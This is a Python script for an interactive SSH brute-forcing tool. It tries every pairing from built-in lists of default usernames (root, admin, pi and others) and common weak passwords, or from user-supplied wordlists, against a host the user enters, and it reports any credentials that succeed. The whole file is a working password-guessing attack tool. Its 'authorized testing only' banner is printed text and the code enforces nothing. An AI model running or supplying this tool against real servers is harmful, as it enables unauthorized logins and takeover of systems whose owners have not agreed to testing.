import paramiko
import os, socket, time

GREEN = "\033[92m"; CYAN = "\033[96m"; YELLOW = "\033[93m"
RED = "\033[91m"; GRAY = "\033[90m"; RESET = "\033[0m"
BOLD = "\033[1m"; ACC = CYAN; BORDER = GREEN

DEFAULT_USERS = ["root","admin","administrator","ubuntu","pi","user","test","guest"]
DEFAULT_PASSES = ["admin","password","123456","root","toor","pass","test","guest",
                  "admin123","password123","12345678","qwerty","abc123"]

def ssh_bruteforce(host, port, userlist, passlist, delay=0.3):
    print(f"\n  {ACC}[*] Target: {host}:{port}{RESET}")
    print(f"  {ACC}[*] Users: {len(userlist)} | Passwords: {len(passlist)}{RESET}")
    print(f"  {YELLOW}[!] For authorized testing only.{RESET}\n")

    # Check if host is reachable
    try:
        socket.setdefaulttimeout(5)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, int(port)))
    except:
        print(f"  {RED}[!] Cannot reach {host}:{port}{RESET}")
        return

    found = []
    total = len(userlist) * len(passlist)
    count = 0

    for username in userlist:
        for password in passlist:
            count += 1
            print(f"  {GRAY}[{count}/{total}] Trying {username}:{password}{RESET}", end="\r")
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port=int(port), username=username,
                               password=password, timeout=4, banner_timeout=4)
                print(f"\n  {GREEN}[+] SUCCESS! {username}:{password}{RESET}")
                found.append((username, password))
                client.close()
                time.sleep(delay)
            except paramiko.AuthenticationException:
                time.sleep(delay)
            except paramiko.SSHException:
                print(f"\n  {YELLOW}[!] SSH error — target may be blocking. Slowing down...{RESET}")
                time.sleep(2)
            except Exception as e:
                print(f"\n  {RED}[!] Error: {e}{RESET}")
                return

    if found:
        print(f"\n  {GREEN}[+] Found {len(found)} credential(s):{RESET}")
        for u, p in found:
            print(f"      {GREEN}{u}:{p}{RESET}")
    else:
        print(f"\n  {RED}[-] No valid credentials found.{RESET}")

def run_ssh_bruteforce():
    while True:
        print(f"""
{BORDER}{'─'*45}{RESET}
{ACC}{BOLD}  SSH BRUTEFORCER{RESET}
{BORDER}{'─'*45}{RESET}
  {ACC}[1]{RESET} Quick scan (built-in lists)
  {ACC}[2]{RESET} Custom wordlists
  {ACC}[b]{RESET} Back
{BORDER}{'─'*45}{RESET}
  {GRAY}Authorized testing only.{RESET}""")
        choice = input(f"  {ACC}[ssh]>{RESET} ").strip().lower()

        if choice == "1":
            host = input(f"  {GRAY}Target host/IP: {RESET}").strip()
            port = input(f"  {GRAY}Port [22]: {RESET}").strip() or "22"
            if host: ssh_bruteforce(host, port, DEFAULT_USERS, DEFAULT_PASSES)

        elif choice == "2":
            host = input(f"  {GRAY}Target host/IP: {RESET}").strip()
            port = input(f"  {GRAY}Port [22]: {RESET}").strip() or "22"
            ufile = input(f"  {GRAY}Userlist path: {RESET}").strip()
            pfile = input(f"  {GRAY}Passlist path: {RESET}").strip()
            if not os.path.exists(ufile):
                print(f"  {RED}[!] Userlist not found.{RESET}")
                continue
            if not os.path.exists(pfile):
                print(f"  {RED}[!] Passlist not found.{RESET}")
                continue
            with open(ufile,'r',errors='ignore') as f:
                users = [l.strip() for l in f if l.strip()]
            with open(pfile,'r',errors='ignore') as f:
                passwords = [l.strip() for l in f if l.strip()]
            if host: ssh_bruteforce(host, port, users, passwords)

        elif choice == "b":
            break
        else:
            print(f"  {YELLOW}[!] Invalid option.{RESET}")
        input(f"\n  {GRAY}Press Enter to continue...{RESET}")
